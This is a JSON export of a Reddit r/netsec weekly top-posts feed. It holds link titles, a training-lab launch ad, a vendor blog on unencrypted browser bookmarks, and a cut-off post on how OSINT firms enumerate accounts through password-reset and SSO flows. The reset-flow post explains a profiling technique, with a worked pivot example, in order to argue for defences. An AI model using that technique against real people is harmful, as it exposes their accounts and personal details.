{"id":"sML2JBPsdAyS6VtxX1nYrwK8E9RQ5WvH1LNVbcmAV1wNnbFFD7qWbUHZZMepDPsG","title":"top scoring links : netsec","displayTitle":"Reddit - NetSec","url":"https://www.reddit.com/r/netsec/top/.rss?t=week","feedLink":"https://www.reddit.com/r/netsec/top/?t=week","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":31,"items":[{"title":"\"How CyberCatch is using their AI-enabled platform for continuous compliance and risk mitigation\" BNN Bloomberg LIVE Interview with CyberCatch CEO, Sai Huda Security","url":"https://vimeo.com/1005527946/5a03dfe5d8","date":1742843925,"author":"/u/Appropriate-Hunt-897","guid":13403,"unread":true,"content":"<p>\n        To continue, please confirm that you're a human (and not a spambot).\n      </p><div role=\"main\"><div><h2>\n            Checking if the site connection is secure\n          </h2><div>\n            vimeo.com needs to review the security of your connection before\n            proceeding.\n          </div></div></div>","contentLength":261,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jiz7px/how_cybercatch_is_using_their_aienabled_platform/"},{"title":"Former U.S. Homeland Security Secretary Tom Ridge serves as a strategic advisor to CyberCatch, having inspired CEO Sai Huda to launch the company.","url":"https://cybercatch.com/tomridgemessage/","date":1742837172,"author":"/u/Appropriate-Hunt-897","guid":13374,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jiwbrl/former_us_homeland_security_secretary_tom_ridge/"},{"title":"Bypassing Detections with Command-Line Obfuscation","url":"https://wietze.github.io/blog/bypassing-detections-with-command-line-obfuscation","date":1742808530,"author":"/u/Wietze-","guid":12747,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jimof1/bypassing_detections_with_commandline_obfuscation/"},{"title":"Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)","url":"https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/","date":1742806326,"author":"/u/Mempodipper","guid":12740,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jim7sp/doing_the_due_diligence_analyzing_the_nextjs/"},{"title":"After a decade of open source security educational tools (SecGen), we've launched a hosted platform, Hacktivity","url":"https://hacktivity.co.uk/posts/subscriptions-for-individuals","date":1742723642,"author":"/u/zcliffe","guid":9966,"unread":true,"content":"<h2>Launch Announcement of Subscriptions for Individuals</h2><p>After a decade of proven success in university settings, we're excited to announce the public launch of Hacktivity Cyber Security Labs – now available to everyone who wants to develop practical cyber security skills.</p><p>Whether you're looking to start a career in cyber security, level up your current skills, or simply enjoy the challenge of ethical hacking, Hacktivity offers something unique: hands-on experience with randomized challenges, detailed lab instructions, automated attack bots, and multiple CTF challenges in every lab - all mapped to the Cyber Security Body of Knowledge (CyBOK) to track your growing expertise.</p><h2>Comprehensive, Structured Learning</h2><p>If you are looking for a structured learning environment, with detailed labs and challenges, then Hacktivity has just what you need. </p><ul><li>Ethical Hacking and Penetration Testing</li><li>Incident Response and Investigation</li><li>Reverse Engineering and Malware Analysis</li><li>Software Security and Exploit Development</li></ul><p>Each course starts with the fundamentals and progressively builds to advanced concepts.</p><p>You’ll develop the skills to conduct ethical hacking penetration tests, investigate security breaches, harden systems against attack, analyse malware, and even find new vulnerabilities and write your own exploits.</p><h2>Randomisation for a New Approach to Learning Cyber Security</h2><p>Every time you start a lab in Hacktivity, you're entering a unique environment. Just like in the real world, every security scenario presents its own unique challenges that require adaptability and real understanding. Your systems will have unique system configurations, such as usernames, passwords, and IP addresses, your flags and solutions will be different each time you run through a lab, and the details of challenges, such as the actual security vulnerabilities you are attacking, can be randomised. This isn't just about preventing solution sharing – it's about building genuine understanding and adaptability.</p><h2>Track Your Growth with CyBOK Integration</h2><p>All the content on Hacktivity, from individual labs and challenges through to explainer videos, is mapped to the Cyber Security Body of Knowledge (CyBOK). This helps us to clearly communicate to you what knowledge each course covers. </p><p>Uniquely Hacktivity will help you track your learning progress, helping you to visualize your learning journey and understanding your strengths. As you complete challenges, you'll see your Knowledge Experience (KXP) grow, creating a clear visualization of your developing expertise. This isn't just about tracking progress – you will also be building a profile that demonstrates your real capabilities.</p><h2>A SPICEy Learning Environment</h2><p>Forget struggling with VPNs or dealing with laggy browser interfaces. Hacktivity provides a premium desktop experience that feels local but runs in our secure cloud. Through SPICE technology, you get seamless copy-paste support, smooth performance, and all the tools you need for each lab – pre-configured and ready to use. Experience labs frustration free, without needing to manage your own local VMs or faff about with VPNs.</p><h2>Interactive Learning with Hackerbot</h2><p>Meet your personal cyber adversary: Hackerbot. Hackerbot is used to create engaging defensive and investigative labs. Unlike passive learning environments, Hackerbot actively engages with you – launching real attacks against your systems, providing instant feedback, and guiding you through complex scenarios.</p><h2>Launch Special: Professional Training at an Accessible Price</h2><p>Whether you're a complete beginner or an experienced professional looking to expand your skills, Hacktivity provides the structured learning environment and hands-on experience you need to succeed in cyber security.</p><p>To celebrate our public launch, we're offering our Pro plan at just  (billed annually).</p><p>That is a , which gives you access to our entire course catalog and all core platform features, at an amazing price and value for money. </p><p>Ready to begin? Subscribe now at our special launch price.</p><div><div><div><div><div><div><p>For great value access to training and hacking challenges</p><div><p><small></small></p></div><div><p><small></small></p><p><small>Billed annually. </small></p></div></div></div></div><div><div><div><div><p><small></small></p></div><div><p><small></small></p><p><small>Billed annually. </small></p></div></div></div></div></div><a href=\"https://hacktivity.co.uk/pricing\">Compare All Features</a></div></div><p>I look forward to seeing you on Hacktivity!</p>","contentLength":4175,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jhvszk/after_a_decade_of_open_source_security/"},{"title":"Secrets.tools - security tool for scanning login pages for secrets, emails, ips and urls","url":"https://secrets.tools/","date":1742673888,"author":"/u/bubblehack3r","guid":9551,"unread":true,"content":"<p>Scanning website, please wait...</p>","contentLength":32,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jhhbvs/secretstools_security_tool_for_scanning_login/"},{"title":"Profile Image Intel - OSINT Tool for checking when profile pictures were last changed","url":"https://profileimageintel.com/","date":1742673794,"author":"/u/bubblehack3r","guid":9166,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jhhak2/profile_image_intel_osint_tool_for_checking_when/"},{"title":"TraceFind - Email OSINT Tool - Information Gathering | DM for free credits - no AD, I want your opinion on it.","url":"https://tracefind.info/","date":1742663655,"author":"/u/ProtDos","guid":8777,"unread":true,"content":"<h2>Export to Multiple Formats.</h2><p>Analyse information directly within our platform, or export your findings in your preferred supported format: . Our reporting tools are designed to highlight key data, making it easier for you to draw conclusions and make informed decisions on your next move. </p>","contentLength":287,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jhdeb7/tracefind_email_osint_tool_information_gathering/"},{"title":"Palo Alto Cortex XDR bypass (CVE-2024-8690)","url":"https://cybercx.com.au/blog/palo-alto-cortex-xdr-bypass/","date":1742590452,"author":"/u/CptWin_NZ","guid":6556,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jgra20/palo_alto_cortex_xdr_bypass_cve20248690/"},{"title":"There's a big problem with browser bookmark security.","url":"https://webcull.com/blog/2025/03/the-problems-with-browser-bookmark-security","date":1742568434,"author":"/u/TheThingCreator","guid":6459,"unread":true,"content":"<p>Published on March 11th, 2025 by Andrew DearSegment: Security</p><p>Modern web browsers store your bookmarks (favorites) in files or databases within your browser’s user profile directory on your computer even if you have sync on. Unlike passwords, these bookmark files are not encrypted – they are stored in plain text or simple database formats for quick access. For example, Mozilla Firefox keeps all bookmarks in an <a href=\"https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\" rel=\"nofollow\" target=\"_blank\">SQLite database</a>. Google Chrome, Microsoft Edge (Chromium-based), and other Chromium browsers use a JSON-formatted file (commonly named “Bookmarks”) to save bookmark data. Apple’s Safari similarly saves bookmarks in a <a href=\"https://discussions.apple.com/thread/7535292?sortBy=rank\" rel=\"nofollow\" target=\"_blank\">property list file</a> (Bookmarks.plist) in the user’s Library folder. Additionally given that these bookmarks are stored in plain text, they are also <a href=\"https://www.helpnetsecurity.com/2022/08/02/data-exfiltration-via-bookmarks/\" rel=\"nofollow\" target=\"_blank\">vulnerable to being manipulated</a>. In all cases, the bookmark data (titles, URLs, tags, and notes) are readable and not protected by encryption or a password.</p><p>Storing bookmarks in plain form is primarily a design choice for convenience, especially when transitioning between browsers. However, this convenience comes at a cost: any program or malware running under your operating system account can potentially access these files and read your bookmarks without needing any special permission or decryption key. In contrast, browsers often encrypt sensitive items like saved passwords or cookies with an OS-provided key but bookmarks incorrectly don’t get the same treatment.</p><h3>Security Risks of Exposed Bookmark Data</h3><p>Because bookmarks are stored unencrypted, they are vulnerable to unauthorized access by spyware, malware, or even legitimate applications that probe your browser data. A malware that infects your system can simply read the bookmark file or database and steal its contents. In fact, malware and hacker toolkits explicitly target browser bookmarks as part of the data they gather from victims. The <a href=\"https://attack.mitre.org/techniques/T1217/\" rel=\"nofollow\" target=\"_blank\">MITRE ATT&amp;CK database</a> notes that “data saved by browsers (such as bookmarks) may reveal a variety of personal information about users”​ including “banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure”. Additionally it lists numerous threats that leverage bookmark data.</p><ul><li><strong>APT38 (Lazarus Group - North Korea):</strong> Collects browser bookmark information to gather intelligence about compromised hosts, obtain personal user details, and identify internal network resources.</li><li> MacOS-focused Trojan that steals Google Chrome bookmarks to uncover sensitive web portals or enterprise applications.</li><li> Chinese-linked APT group that retrieves bookmarks from Windows user directories, particularly from Internet Explorer and Citrix environments, for corporate espionage.</li><li> MacOS-based info stealer that collects bookmarks, cookies, and history from Safari for phishing and reconnaissance.</li><li> Open-source post-exploitation framework that steals browser bookmarks and visited sites for lateral movement and privilege escalation.</li><li> Iranian APT group that steals Google Chrome bookmarks to map internal corporate resources and privileged access points.</li><li> Russian-developed malware that retrieves browser history and bookmarks for target profiling.</li><li> Espionage malware that retrieves user profile data, including bookmarks, from Google Chrome and Mozilla Firefox.</li><li><strong>Moonstone Sleet (Russian APT):</strong> Russian-linked threat actor that deploys malware capable of capturing browser information.</li><li> Malware designed to collect browser bookmarks and history as part of reconnaissance operations.</li><li><strong>Volt Typhoon (Chinese APT):</strong> China-linked APT that targets network administrators’ browser data to identify critical infrastructure systems.</li></ul><p>These real-world examples show that bookmarks are actively being harvested in cyberattacks. In some cases, stolen bookmarks have been used to facilitate targeted phishing or intrusion. Once obtained, an attacker can analyze your bookmarks to learn your habits or to plan further attacks.  For instance, an attacker with access to your bookmarks could see that you frequent a particular banking website and then craft a phishing email related to that bank. In an enterprise scenario, if an attacker finds bookmarks to internal sites or VPN portals, they gain clues on how to penetrate deeper into the network.</p><p>Additionally, the integrity of your bookmarks can be manipulated by malware. Because there’s no protection against modification, malware that infects a system can insert malicious bookmarks or alter existing ones. One documented attack method is to add a bookmark that looks benign but actually leads to a malicious site – effectively luring the user to click it later. There have been cases where invisible malware <a rel=\"nofollow\" target=\"_blank\" href=\"https://www.reddit.com/r/antivirus/comments/16d9jfj/can_somebody_explain_how_this_malware_works/\">planted a bookmark in the browser</a>; when the user eventually clicked it, it led to a malware-infested page that installed further malware​. Security researchers have shown that attackers could use bookmark synchronization features as a covert channel – for example, by inserting stealthy bookmarks that carry encoded data out of the network via the browser’s cloud sync​. Once malware has file access, it can also change a bookmarked URL to point to a lookalike phishing page (while keeping the familiar title), tricking users into a “two-step” phishing attack​.</p><p>In short, unprotected bookmarks present both a confidentiality risk (they can be read by unauthorized actors) and an integrity risk (they can be altered for malicious purposes).</p><h3>Bookmarks as a Privacy Liability (Profiling and Tracking)</h3><p>Outside of cyberattacks, your collection of bookmarks can pose a privacy risk if it falls into the wrong hands. Bookmarks often include an intentionally curated set of websites that you consider important – which means they can paint a detailed picture of your life, interests, and activities. A cybersecurity discussion on <a href=\"https://security.stackexchange.com/questions/171618/is-there-a-security-risk-in-having-my-bookmarks-publicly-accessible#:~:text=I%20think%20you%20have%20answered,your%20own%20question\" rel=\"nofollow\">Stack Exchange</a> noted that leaking your bookmarks “would let someone build a pretty good picture of who you are and your interests” including personal details inferred from your saved bank, shopping, social, or email bookmarks​. A glance at someone’s bookmarks might reveal their union, vacation plans, calendar events, children's schools, health-related forums, favorite news sources, or hobby sites – all information that could be used for profiling or social engineering.</p><p>From a tracking and analytics standpoint, an application or browser extension that can silently read your bookmarks could use them to profile you for targeted advertising or data mining. Unlike browsing history (which is a raw log of everything you visited), bookmarks represent intentional interests – sites you plan to revisit or care about. This can be very valuable for profiling. An attacker or intrusive app could combine bookmark data with other information to create a comprehensive dossier on a user’s online life. In corporate settings, bookmarks might even include links to internal tools or project pages, which could expose company affiliations or projects. In one reported APT incident, stolen browser bookmarks were used to identify internal servers and resources in a target’s network​ – effectively using the victim’s own “favorites” to map out what to attack.</p><p>There’s also the risk of sensitive information in bookmark URLs. Some bookmarked URLs may contain query strings with identifiers or keys that are private. For instance, if you bookmark a web application while you’re logged in or viewing a specific record, the URL might include session tokens or database IDs. If an attacker obtains those bookmarks, they might glean information from the URL itself, or potentially reuse a still-valid token. As one security forum answer noted, a bookmark could inadvertently store an account ID or transaction number in its URL – data you wouldn’t want exposed publicly​. All of these concerns make it clear that bookmarks should be treated as personal data.</p><p>Easy access comes at a risk. Browser vendors have prioritized easy access to bookmarks for features like import/export and synchronization. The downside is that any program running under your account can equally access that data. A vivid example of the convenience trade-off is how browsers import bookmarks from each other. Because the bookmark files are readily readable, one browser can scoop up another’s bookmarks to help you “seamlessly” switch. In fact, Microsoft Edge <a href=\"https://www.theregister.com/2024/01/30/microsoft_edge_tabs/#:~:text=Updated%20Windows%20users%2C%20take%20notice%3A,makes%20that%20happen%20is%20disabled\" rel=\"nofollow\" target=\"_blank\">was observed</a> automatically importing users’ Chrome bookmarks, history, cookies, and other data on first launch without explicit permission in some cases​. This was intended to simplify setup, but it raised privacy alarms: Edge essentially read Chrome’s unencrypted data behind the scenes. Microsoft even synced that data to the user’s Microsoft account if logged in​, which would have potentially invalidated any end-to-end encryption the Chrome user might have established. While users can disable such features, the incident highlights that one application can freely read another’s bookmarks without consent or knowledge of it happening.</p><p>There’s an ongoing discussion about whether this status quo is acceptable. Some security researchers argue that browsers could do more, such as preventing outside programs from reading the bookmark file or at least <a href=\"https://webcull.com/blog/2024/06/encrypt-bookmarks-with-e2ee\">encrypting the data</a>. As of now, however, there is no industry standard requiring encryption of bookmark data at rest. Regulators have not specifically addressed browser bookmarks in privacy laws, likely because bookmarks are misunderstood as not as sensitive as, say, passwords or credit card numbers. However, under broad privacy regulations (like GDPR or CCPA), if an organization were to collect a user’s bookmarks, it would probably qualify as personal data. Some cloud-based bookmark platforms take a different approach by having no locally saved copies, ensuring they remain secure from local threats. Unlike traditional browser storage, these services never store bookmarks in an unencrypted state. For instance, <a href=\"https://webcull.com/\">WebCull</a> encrypts bookmarks at rest, on device, and never stores bookmarks locally, greatly reducing attack vectors.</p><h3>Logging Out Doesn’t Hide Your Bookmarks</h3><p>A common but mistaken belief is that logging out of your browser profile removes or conceals your bookmarks on that device. In reality, bookmarks remain stored locally, fully visible, and easily accessible even after you've logged out. This issue becomes particularly troublesome when you sign into your browser profile on devices that aren't exclusively yours—such as a family member’s or a workplace computer. Your bookmarks, potentially revealing sensitive or private interests remain, in plaintext, and browsers provide very limited options to control or remove this local bookmarks upon logout. This oversight means that simply logging out is insufficient for privacy. Anyone subsequently using that device can see your bookmarks, posing privacy and security risks.</p><h3>Misconceptions About Browser Sync Encryption</h3><p>A common incorrect assumption is that enabling end-to-end encryption (E2EE) in a browser’s sync system means their bookmarks are fully protected. While it is true that <a href=\"https://webcull.com/blog/2024/08/bookmark-sync-security\">some browsers</a>, like Firefox and Chrome with a custom passphrase, encrypt bookmark data <a href=\"https://webcull.com/blog/2025/03/an-important-security-consideration-when-using-e2ee\">before syncing</a> it to the cloud, this protection only applies to transmission and storage on the provider's servers. The reality is that even with E2EE enabled, bookmarks remain unencrypted at rest on the local machine. This means that any program, malware, or unauthorized user with access to the device can still read and extract bookmarks from the browser’s profile folder. This misunderstanding can create a false sense of security, in fact, they remain fully accessible on device, vulnerable to spyware, local attacks, or forensic data extraction.</p><h3>Regulatory Risks of Storing Bookmarks Unencrypted with Personal Data</h3><p>From an institutional standpoint, storing bookmarks unencrypted at rest could present serious <a href=\"https://webcull.com/blog/2024/07/web-management-tools-encryption\">GDPR or CCPA compliance violations</a> if those bookmarks contain personally identifiable information (PII). Many bookmarked URLs, especially within enterprise environments, include metadata or query strings that contain sensitive user data—such as session IDs, usernames, account numbers, or even direct links to confidential records. If an organization retains such bookmarks without encryption, any unauthorized access, data breach, or forensic recovery of the file could expose private user data, making it a potentially reportable privacy incident under GDPR. Under these regulations, companies are required to protect user data with appropriate security measures, and failing to encrypt or restrict access to stored bookmarks could be interpreted as negligence in safeguarding PII. In the event of a data breach, organizations could face hefty fines—up to €20 million or 4% of global revenue under GDPR, and similarly significant penalties under CCPA. This underscores the legal and financial risks of treating bookmarks as trivial, when in reality, they can contain highly sensitive user information.</p><p>Given these realities, it’s clear that bookmark security deserves greater attention both from individual users and organizations. The common misunderstanding around browser-based end-to-end encryption highlights how crucial it is to distinguish between cloud protection and local vulnerabilities. Institutions especially must recognize the significant legal and regulatory risks involved in storing bookmarks containing personally identifiable information (PII) without encryption. Until browsers adopt stronger security measures, users and organizations should proactively consider secure alternatives—like <a href=\"https://webcull.com/\">cloud-based bookmark managers</a> that ensure bookmarks remain encrypted and isolated from potential threats—to safeguard personal data and maintain compliance with privacy laws like GDPR and CCPA.</p>","contentLength":13892,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jgij4f/theres_a_big_problem_with_browser_bookmark/"},{"title":"What not to do with on prem virtualization","url":"https://therealunicornsecurity.github.io/What-not-to-do-with-vms/","date":1742560850,"author":"/u/_kawhl","guid":6432,"unread":true,"content":"<div><p>A compilation of techniques used in AD pentest, and some countermeasures for sys admins</p></div>   submitted by   <a href=\"https://www.reddit.com/user/_kawhl\"> /u/_kawhl </a>","contentLength":116,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jgfvkp/what_not_to_do_with_on_prem_virtualization/"},{"title":"The National Security Case for Email Plus Addressing","url":"https://sagi.io/the-national-security-case-for-email-plus-addressing/","date":1742482343,"author":"/u/kedmi","guid":6163,"unread":true,"content":"<ul><li>OSINT firms and attackers exploit password recovery flows to confirm account existence and leak partial personal data (phone digits, email patterns, etc.).</li><li>Single Sign-On (SSO) services often use the same email address everywhere, making it easier to correlate accounts.</li><li>This becomes a national security issue when adversaries build large-scale dossiers on government and military personnel.</li><li>Simple email “plus addressing” or masked email solutions can help compartmentalize accounts, thwarting large-scale OSINT.</li><li>Websites should standardize their password reset responses and limit info leakage; policymakers and security pros should push for aliasing tools and privacy-first defaults.</li></ul><p>For those who prefer audio content, here’s a quick breakdown of the blog post featured in my podcast:</p><p>Imagine a foreign intelligence agent or cybercriminal can find out  online service you use, just by knowing your email address. By exploiting the password recovery features of websites – those  flows we all rely on – specialized Open Source Intelligence (OSINT) firms and threat actors are quietly mapping users’ online accounts and even extracting snippets of personal data. This isn’t a hypothetical scare story; it’s an everyday reality in the world of digital espionage and cybercrime. And it’s not just a privacy nightmare for individuals – it’s a growing  concern when adversaries can assemble detailed profiles of government officials, military personnel, and corporate leaders through openly available mechanisms.</p><p>In this deep dive, we explore how password reset and single sign-on mechanisms have become an intelligence goldmine for attackers. We’ll see how <strong>OSINT companies exploit password recovery flows</strong> to infer account existence and grab partial personal identifiers (like phone number fragments and credit card digits). We’ll examine the role of  services (like “Sign in with Google”) in inadvertently standardizing our identities across the web, making it easier to track targets. We’ll also uncover some sneaky  that give away even more information to prying eyes. Most importantly, we’ll explain <em>why all of this matters for national security</em> – how hostile nation-states or organized cybercriminals could weaponize this data for phishing, identity theft, social engineering, or large-scale intelligence gathering. Finally, we’ll discuss : from simple tricks like email “plus addressing” (e.g. ) to more advanced solutions like masked email services and policy changes that can help harden our authentication systems.</p><p>Whether you’re a policymaker crafting cybersecurity regulations or a security professional looking to close an underrated leak, this article will shed light on a silent threat – and how a tweak as small as how we use our email addresses can make a big difference.</p><h2><a href=\"https://sagi.io/the-national-security-case-for-email-plus-addressing/#how-osint-firms-exploit-password-recovery-flows\" aria-label=\"how osint firms exploit password recovery flows permalink\"></a>How OSINT Firms Exploit Password Recovery Flows</h2><p>When you click “Forgot password?” on a website, the response you get can tell an attacker a lot more than you’d expect. <strong>OSINT investigators routinely abuse password reset flows</strong> as an information source. In fact, some commercial OSINT platforms boast the ability to input a single email address and check it against  of sites automatically (<a href=\"https://www.osint.industries/post/inbox-intel-how-to-use-emails-for-osint#:~:text=and%20relax%20as%20our%20platform,and%20potentially%20their%20location%20using\" target=\"_blank\" rel=\"noopener\">Inbox Intel: How to Use Emails for OSINT</a>). If an account exists on, say, a fitness app or a travel site under that email, the tool will find it – and often scrape whatever tidbits the password reset page reveals.</p><p>Why are password reset pages so revealing? Consider what happens when you initiate a password reset on a typical site. Often, the site doesn’t outright show the email or phone number on the account (for security), but it does show  as a hint. For example, it might say “We’ve sent a verification code to phone number ending in ” or “An email has been sent to @gmail.com*<em>.” These hints are meant to help a legitimate user remember which contact info they used – but they also hand a clever attacker confirmation that an account *does\\</em> exist, plus fragments of sensitive data.</p><p>It’s not only phone numbers. Some password recovery flows will hint at <strong>email addresses or usernames</strong>, show profile names, or even reveal <strong>partial credit card digits</strong> if a credit card is on file as a recovery option. In one infamous case, hackers exploited account recovery procedures at Amazon and Apple: Amazon’s customer support revealed the last four digits of a credit card, which Apple accepted as proof of identity to reset an AppleID. The <strong>same four digits that Amazon considered too trivial to hide were considered secure verification by Apple</strong>, creating an unintended backdoor into a journalist’s Apple iCloud account (<a href=\"https://www.macstories.net/news/mat-honan-how-apple-and-amazon-security-flaws-led-to-my-epic-hacking/#:~:text=,we%20enter%20the%20era%20of\" target=\"_blank\" rel=\"noopener\">Mat Honan: How Apple and Amazon Security Flaws Led to My Epic Hacking - MacStories</a>). This chain-reaction attack (known from Wired journalist Mat Honan’s 2012 hack) illustrates how <strong>partial info leaks can be combined across services</strong> to compromise accounts (<a href=\"https://www.macstories.net/news/mat-honan-how-apple-and-amazon-security-flaws-led-to-my-epic-hacking/#:~:text=,we%20enter%20the%20era%20of\" target=\"_blank\" rel=\"noopener\">Mat Honan: How Apple and Amazon Security Flaws Led to My Epic Hacking - MacStories</a>). While that attack involved social engineering customer support, the principle is the same for automated OSINT: bits of personal data exposed in one context can be the key to unlock another.</p><p>Specialized OSINT companies have weaponized these password reset quirks. They maintain large databases of websites and their account-recovery behaviors, and they run targeted queries en masse. For instance, the OSINT firm “OSINT Industries” describes how their platform can <strong>verify if an email is registered on popular services via password resets</strong>, often revealing associated usernames or partial phone numbers without ever logging in (<a href=\"https://www.osint.industries/post/inbox-intel-how-to-use-emails-for-osint#:~:text=Verification%20techniques%20for%20email%20OSINT,as%20we%E2%80%99ll%20explain%20later\" target=\"_blank\" rel=\"noopener\">Inbox Intel: How to Use Emails for OSINT</a>) (<a href=\"https://www.osint.industries/post/inbox-intel-how-to-use-emails-for-osint#:~:text=Another%20technique%20is%20to%20use,leads%20without%20exposing%20sensitive%20data\" target=\"_blank\" rel=\"noopener\">Inbox Intel: How to Use Emails for OSINT</a>). Their tool will, behind the scenes, go to Facebook, Twitter, Instagram, and hundreds of other platforms, enter the email in “Forgot Password,” and record the response. If Twitter’s reset page returns a masked email like  and says a code was sent to phone , the OSINT analyst learns two valuable facts: the person has a Gmail address starting with “j” and ending with “5”, and a phone number ending in 67. They can then pivot – perhaps trying that Gmail address on Google’s own account recovery to see if it asks for a phone number ending in 67, confirming it’s the same person. This technique was documented step-by-step by one OSINT enthusiast who managed to enumerate a target’s Gmail address by stitching together clues from a Facebook reset (which showed an obfuscated Gmail) and a Google reset page (<a href=\"https://exploits.run/password-osint/#:~:text=Now%20I%20knew%20a%20potential,was%20able%20to%20view%20this\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>) (<a href=\"https://exploits.run/password-osint/#:~:text=Jackpot,guesses%2C%20a%20password%20reset%20screen\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>).</p><p>Not all websites are leaky in the same way. Interestingly, some sites’ password reset forms are more “chatty” than others about user details. A mini-study posted on Exploits.run noted that <strong>Microsoft’s password reset will display a phone number with only the last 2 digits revealed</strong>, while Pinterest’s will show a partially redacted email _and even the user’s public profile name** (<a href=\"https://exploits.run/password-osint/#:~:text=Microsoft%3A%20Displays%20redacted%20phone%20number,Do%20not%20use\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>). Twitter will show a partially masked email (with an accurate mask length matching the email length), whereas Instagram and LinkedIn won’t show anything useful (they directly send a reset email, tipping off the user) (<a href=\"https://exploits.run/password-osint/#:~:text=Twitter%3A%20Entering%20a%20Twitter%20username,as%20a%20redacted%20email%20address\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>) (<a href=\"https://exploits.run/password-osint/#:~:text=without%20an%20accurate%20character%20count,Do%20not%20use\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>). This lack of standardization is exactly what makes the attack surface so broad – an OSINT attacker can simply gravitate toward the services that give the most revealing responses. As one security article put it, there is a _“lack of standardization in handling private info”* in these flows, creating a security chasm that attackers can exploit (<a href=\"https://portswigger.net/daily-swig/new-osint-technique-exploits-password-reset-process-to-obtain-users-phone-numbers#:~:text=Failure%20to%20mask%20users%E2%80%99%20personally,number%20and%20email%20address%20records\" target=\"_blank\" rel=\"noopener\">New OSINT technique exploits password reset process to obtain users’ phone numbers | The Daily Swig</a>). In short, the password reset feature – intended to help users – has become a quiet informer, spilling secrets about which online accounts you hold and pieces of your personal data.</p><h2><a href=\"https://sagi.io/the-national-security-case-for-email-plus-addressing/#the-role-of-single-sign-on-in-privacy-erosion\" aria-label=\"the role of single sign on in privacy erosion permalink\"></a>The Role of Single Sign-On in Privacy Erosion</h2><p>The proliferation of  options (like “Sign in with Google”, Facebook, or Apple) was supposed to make our lives easier and more secure by reducing password reuse. However, SSO has a side effect that plays straight into the hands of adversaries: it encourages us to use one  (often our primary email address) across many sites. If you always click “Sign in with Google,” you’re always using the <em>same Google account email</em> on each service – and that consistency makes it much easier for someone tracking you to connect the dots between different accounts.</p><p>Think about it: when you use Google to log into, say, a discussion forum or a shopping site, that site typically gets access to your Google profile basics – your verified email, maybe your name (<a href=\"https://developers.google.com/identity/sign-in/web/people#:~:text=Developers%20developers,profile%20URL%2C%20and%20email%20address\" target=\"_blank\" rel=\"noopener\">Getting profile information | Authentication - Google Developers</a>). It  sees the same email address because Google doesn’t generate site-specific aliases in that process. Now, if any of those third-party sites suffers a data breach or carelessly exposes your email, an attacker can take that email and immediately know it’s the key to  the other services where you used Google SSO. In other words, SSO can become a single point of correlation. From a privacy perspective, using a single email everywhere (which SSO by design does) creates the ultimate breadcrumb trail for OSINT.</p><p>It’s not all bad news, though. There are emerging SSO models that aim to  the cross-site correlation. <strong>Apple’s “Sign in with Apple”</strong> is a compelling counter-example focused on privacy. Whenever you use Apple SSO, you have the option to  which generates a unique random email address just for that app or website (<a href=\"https://support.apple.com/en-us/105078#:~:text=Hide%20My%20Email%20generates%20unique%2C,email%20address%20is%20kept%20private\" target=\"_blank\" rel=\"noopener\">How to use Hide My Email with Sign in with Apple - Apple Support</a>). Mail sent to this address forwards to your real email, but the app never sees your actual address. Only Apple (as the intermediary) knows the mapping, and Apple asserts that it doesn’t scan or store the content of emails in this relay (<a href=\"https://support.apple.com/en-us/105078#:~:text=this%20option%20in%20Sign%20in,set%20on%20your%20Apple%20Account\" target=\"_blank\" rel=\"noopener\">How to use Hide My Email with Sign in with Apple - Apple Support</a>). In practice, this means if you use “Sign in with Apple” on, say, Example.com, they might see an identifier like  instead of . If Jane uses a different relay address for each site, those sites can’t as easily determine that it’s the same Jane behind them. More importantly, if one relay address leaks or is checked by an OSINT operative, it won’t directly reveal all the other places Jane has accounts – each one has a distinct identifier. Apple’s approach shows that <strong>SSO doesn’t have to mean using the same email everywhere</strong> – it’s possible to have the convenience of single sign-on while still protecting identity siloing. Unfortunately, outside the Apple ecosystem, such aliasing features are not common. Google and Facebook logins still use a single email identity, so unless you take extra steps yourself, you’re leaving a consistent trail.</p><p>In summary, Single Sign-On services, while great for reducing password headaches, often trade away a chunk of privacy. They tether your accounts together via one email, making OSINT correlation much easier. A diligent adversary who learns your primary email (from a breach, a leak, or even a guess) can assume that email is your username everywhere – and then leverage password reset flows or other tricks on those sites to gather more intel. Until mainstream SSO providers offer aliasing or better privacy options, <strong>users may need to create their own segmentation (through multiple emails or plus-addressing) to break the linkability that SSO inadvertently encourages.</strong></p><p>Beyond the obvious password reset pages, attackers have a toolkit of  to ferret out account information. “Side-channel” in this context means obtaining data indirectly – not through an official profile or leak, but via some quirky behavior of a system that wasn’t meant to divulge information. We already saw a side-channel with Google’s alternate email leak. Here are a few other ways OSINT practitioners and malicious actors can gather intel beyond the standard password reset:</p><ul><li><strong>Account Enumeration via Error Messages</strong>: Many websites inadvertently 